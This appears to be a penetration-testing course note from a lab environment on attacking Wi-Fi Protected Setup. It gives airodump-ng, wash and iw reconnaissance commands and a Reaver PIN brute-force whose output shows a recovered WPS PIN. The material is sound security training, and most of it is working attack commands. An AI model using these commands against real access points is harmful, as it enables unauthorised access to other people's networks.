# Attacking Wi-Fi Protected Setup (WPS)

First we need to list our available wireless interfaces.

```shell-session
eldeim@htb[/htb]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short  long limit:2   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
```

Then at this point we need to enable monitor mode for our interface.

```shell-session
eldeim@htb[/htb]$ airmon-ng start wlan0
```

To begin searching for networks with WPS we employ the following command. We specify `--wps` to display WPS information and `--ignore-negative-one` to remove -1 PWR error messages.

```shell-session
eldeim@htb[/htb]$ airodump-ng --wps --ignore-negative-one wlan0mon

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID
XX:XX:XX:XX:XX:XX  -43        1        0    0   6  195   WPA2 CCMP   PSK  2.0 LAB   FakeNetwork
XX:XX:XX:XX:XX:XX  -43        1        0    0   6  195   WPA2 CCMP   PSK  1.0 USB   FakeNetwork
XX:XX:XX:XX:XX:XX  -43        1        0    0   6  195   WPA2 CCMP   PSK  1.0 DISP  FakeNetwork
XX:XX:XX:XX:XX:XX  -43        1        0    0   6  195   WPA2 CCMP   PSK  1.0 PBC   FakeNetwork
XX:XX:XX:XX:XX:XX  -43        1        0    0   6  195   WPA2 CCMP   PSK  2.0 PBC   FakeNetwork
60:38:E0:XX:XX:XX   -7   0   24        0    0   8  130   WPA2 CCMP   PSK  1.0 LAB   HTB-Wireless 
```

We could also narrow down our scan further to just our network in question with the following command. We specify the channel with `-c` and the AP MAC with `--bssid`

```shell-session
eldeim@htb[/htb]$ airodump-ng --wps --ignore-negative-one -c 8 --bssid 60:38:E0:XX:XX:XX wlan0mon
```

***

## Scanning WPS Networks with Wash

Wash is another great tool for scanning networks with WPS. We can employ a simple command with wash to display all networks with WPS and their respective versions.

WPS Reconnaissance

```shell-session
eldeim@htb[/htb]$ wash -i wlan0mon

BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
60:38:E0:XX:XX:XX    3  -07  1.0  No   AtherosC  HTB-Wireless
XX:XX:XX:XX:XX:XX    1  -63  2.0  No   LantiqML  FakeNetwork
XX:XX:XX:XX:XX:XX    1  -63  2.0  No   Quantenn  FakeNetwork
XX:XX:XX:XX:XX:XX    1  -61  2.0  No   AtherosC  FakeNetwork
```

<figure><img src="../../.gitbook/assets/image (1271).png" alt=""><figcaption></figcaption></figure>

We can display much more verbose output with wash using the following command.

```shell-session
eldeim@htb[/htb]$ wash -j -i wlan0mon

{"bssid" : "XX:XX:XX:XX:XX:XX", "essid" : "FakeNetwork", "channel" : 1, "rssi" : -61, "wps_version" : 32, "wps_state" : 2, "wps_locked" : 2, "wps_response_type" : "03", "wps_config_methods" : "0000", "wps_rf_bands" : "03", }
{"bssid" : "XX:XX:XX:XX:XX:XX", "essid" : "FakeNetwork", "channel" : 1, "rssi" : -61, "wps_version" : 32, "wps_state" : 2, "wps_locked" : 2, "wps_response_type" : "03", "wps_config_methods" : "0000", "wps_rf_bands" : "03", }
```

It is important to check the `wps_locked` status from wash. If it is set to 2, it means WPS is not in a locked state. Additionally, we can find out which vendor is associated with the access point with the following command, specifying the beginning of the MAC address.

```shell-session
eldeim@htb[/htb]$ grep -i "84-1B-5E" /var/lib/ieee-data/oui.txt

84-1B-5E   (hex)                NETGEAR
```

### **Things to be wary of when testing WPS**

When attempting to test WPS, we want to note the following conditions:

* `The WPS version`.
* `wps_locked status`: We want to ensure that clients can join the network.
* `The WPS Mode`: If we need to press a button to join the network, chances are we are not cracking the PIN this way.
* `Max PIN Attempts Locking`: If the access point locks after a few incorrectly guessed PINs, we likely will not be able to get through all 11,000 possible combinations.

### PoCs - Questions

* How many WIFI networks with WPS are available? (Answer in digit format: e.g., 5)

```
wash -i wlan0
```

***

## **Online PIN Brute-Forcing Attacks**

<figure><img src="../../.gitbook/assets/image (1225).png" alt=""><figcaption></figcaption></figure>

### Brute-forcing WPS PIN

To begin, we need to enable monitor mode. We can use the `iw` command to add a new interface named `mon0` and set its type to monitor mode, as demonstrated below. Due to a known bug, setting the interface to monitor mode using `airmon-ng` can cause `Reaver` to malfunction. Therefore, it is recommended to use the `iw` command for this purpose.

```shell-session
[!bash!]$ iw dev wlan0 interface add mon0 type monitor

[!bash!]$ ifconfig mon0 up

[!bash!]$ iwconfig

lo        no wireless extensions.

eth0      no wireless extensions.

mon0      IEEE 802.11  Mode:Monitor  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          
wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:on
```

Once we've added an interface with monitor mode enabled, we can use `airodump-ng` to enumerate WPS enabled WiFi networks.

```shell-session
[!bash!]$ airodump-ng mon0 --wps

 CH  8 ][ Elapsed: 0 s ][ 2024-06-26 10:06 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID

 AE:EB:B0:11:A0:1E  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    HackMe   
 B2:A5:1D:E1:B2:11  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    GammerZone
 5A:1A:59:B7:E7:97  -28       11        0    0   1   54   WPA2 CCMP   PSK  2.0    Teddy      

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
```

Now we can start bruteforcing using Reaver. To begin, we need to specify the interface with the `-i` argument, the BSSID with the `-b` argument, and the channel with the `-c` argument. Reaver will then automatically begin bruteforcing every possible PIN, which totals `11,000` possible PINs.

```shell-session
[!bash!]$ reaver -i mon0 -b AE:EB:B0:11:A0:1E -c 1 

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from AE:EB:B0:11:A0:1E
[+] Received beacon from AE:EB:B0:11:A0:1E
[!] Found packet with bad FCS, skipping...
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] Associated with AE:EB:B0:11:A0:1E (ESSID: HackMe)
[+] WPS PIN: '96457896'
[+] WPA PSK: '<SNIP>'
[+] AP SSID: 'HackMe'
```
